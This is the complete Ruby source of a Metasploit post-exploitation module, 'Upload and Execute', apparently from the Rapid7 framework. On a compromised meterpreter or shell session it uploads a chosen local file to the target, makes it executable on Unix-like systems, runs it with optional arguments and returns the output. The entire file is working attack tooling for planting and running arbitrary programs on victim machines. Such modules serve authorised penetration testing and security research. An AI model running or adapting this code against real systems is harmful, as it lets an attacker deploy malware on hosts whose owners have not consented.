##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Upload and Execute',
      'Description'  => %q{Push a file and execute it.},
      'Author'       => 'egypt',
      'License'      => MSF_LICENSE,
      'Platform'     => ['win', 'unix', 'linux', 'osx', 'bsd', 'solaris'],
      'SessionTypes' => ['meterpreter', 'shell']
    ))

    register_options([
      OptPath.new('LPATH',   [true, 'Local file path to upload and execute']),
      OptString.new('RPATH', [false, 'Remote file path on target (default is basename of LPATH)']),
      OptString.new('ARGS',  [false, 'Command-line arguments to pass to the uploaded file']),
      OptInt.new('TIMEOUT',  [true, 'Timeout for command execution', 60])
    ])
  end

  def run
    print_status("Uploading #{lpath} to #{rpath}")
    upload_file(rpath, lpath)
    register_file_for_cleanup(rpath)

    if session.platform == 'windows'
      # Don't use cmd.exe /c start so we can fetch output
      cmd = rpath
    else
      # Set 700 so only we can execute the file
      chmod(rpath, 0700)

      # Handle absolute paths
      cmd = rpath.start_with?('/') ? rpath : "./#{rpath}"
    end

    print_status("Executing command: #{cmd}")
    output = cmd_exec(cmd, args, timeout)

    if output.blank?
      print_status('Command returned no output')
    else
      print_line(output)
    end
  end

  def lpath
    datastore['LPATH']
  end

  def rpath
    datastore['RPATH'].blank? ? File.basename(lpath) : datastore['RPATH']
  end

  def args
    datastore['ARGS']
  end

  def timeout
    datastore['TIMEOUT']
  end
end
